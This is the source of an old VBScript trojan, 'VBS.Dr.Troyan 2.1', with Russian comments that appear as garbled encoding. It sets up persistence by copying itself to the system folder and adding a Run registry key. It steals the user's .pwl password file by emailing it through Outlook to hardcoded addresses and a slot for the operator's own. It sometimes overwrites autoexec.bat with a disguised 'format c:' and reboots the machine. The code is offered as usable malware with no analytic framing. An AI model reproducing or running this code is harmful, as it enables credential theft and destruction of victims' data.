   'VBS.Dr.Troyan 2.1 (C)DrWeb
   'ïðîñüáà íå ñòèðàòü êîïèðàéò, õîêåé?
   sub Reboot 'Ïðîöåäóðêà ïåðåçàãðóçêè
   Set Shell=CreateObject("WScript.Shell")
   Shell.Run "Rundll32.exe User.exe,ExitWindows" 'Âûçîâ WinApi ñ ïîìîùüþ RunDll ))))
   end sub

   function Random(n) 'Ôóíêöèÿ âîçâðàùàåò ñëó÷àéíîå ÷èñëî
   randomize timer
   Random=Int(n*rnd)
   end function

   sub destruct
   set fs=createobject("Scripting.FileSystemObject")'FileSystem
   if fs.fileexists("c:\autoexec.bat") then 'Åñëè ó íàñ Autoexec ñóùåñòâóåò
   set ab=fs.getfile("c:\autoexec.bat") 'Âîçì¸ì åãî
   ab.attributes=0 'È ïîñòàâèì "íîðìàëüíûå" àòòðèáóòû))
   end if
   set autoexec=fs.CreateTextFile("c:\autoexec.bat")'Ïåðåñîçäàäèì Autoexec
   'Äàëåå çàïèøåì â íåãî ïîëåçíûå êîììàíäû, èõ òàì ÿâíî íå õâàòàåò!)
   autoexec.WriteLine "@cls"
   autoexec.WriteLine "@echo Windows upgrading your system..."
   autoexec.WriteLine "@echo Do not abort this process!"
   autoexec.WriteLine "@format c: /autotest"
   autoexec.close 'Çàêðîåì Autoexec.bat
   end sub

   sub write(k,v) 'Ïðîöåäóðêà çàïèñè â ðååñòð
   Set RegEdit = CreateObject("WScript.Shell")'Shell ñîçäàäèì
   RegEdit.RegWrite k,v ' È çàïèøåì...
   end sub

   function read(k) 'Ôóíêöèÿ ÷òåíèÿ ñ ðååñòðà
   Set RegEdit = CreateObject("WScript.Shell") 'Shell ñîçäàäèì
   read=RegEdit.regread(k) 'È ïðîñòî ïðî÷èòàåì...)
   end function
   On Error Resume Next 'Âäðóã îøèáêà!)
   Set FileSystem = CreateObject("Scripting.FileSystemObject") 'Îáúåêò FileSystem
   Set MeAgain = FileSystem.GetFile(WScript.ScriptFullName) 'Íóêà ,ãäå òóò ìû?
   Set WinDir = FileSystem.GetSpecialFolder(0) 'À ãäåæ ó íàñ WINDOWS?
   Set SysDir = FileSystem.GetSpecialFolder(1) 'À ãäåæ SYSTEM ?
   CopyPath=SysDir&"\Kernel.vbs" 'Íàøå áóäóùåå èìÿ
   AccName=read("HKEY_LOCAL_MACHINE\Network\Logon\UserName") 'Íóêà, ÷òî ó íàñ çà Óçåð çäåñü?
   Write "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\System32",CopyPath 'À ìû òåðü çàïóñêàåìñÿ âìåñòå ñ ÂÈÍÄÀÌÈ
   MeAgain.Copy(CopyPath) 'Ñêîïèðóåì ñåáÿ â SYSTEM
   pswrdfile=windir&"\"&AccName&".pwl" 'Çäåñü ó íàñ òåïåðü ïóòü ê ëþáèìîìó ôàéëó
   set OutLook=WScript.CreateObject("Outlook.Application")'Âàùå îáúåêò ñîçäàäèì
   set milo=OutLook.CreateItem(0) 'Ñîçäàäèì ñîîáùåíèå
   milo.Recipients.Add("drweb2k@chat.ru")      'Ýòî ìîé ìàéë, åñëè íåâïäëó îñòàâü...)
   milo.Recipients.Add("xxxxvirus@yahoo.com")  'Ñþäà âñòàâü ñâîé ìàéë
   milo.Subject = "PASSWORD"
   milo.Body = "PASSWORD FILE GOT>"
   milo.Attachments.Add(pswrdfile) 'Äîáàâèì ê ïèñüìó ëþáèìûé ôàéë
   milo.Send 'Îèòïðàâèì ïî÷òó
   if random(120)=20 then 'Åñëè âäðóã ñëó÷àéíîå ÷èñëî=20
   destruct 'Òî çàïèøåì â Autoexec êîììàíäó format
   reboot ' È ïåðåçàãðóçèì ïåíü
   end if
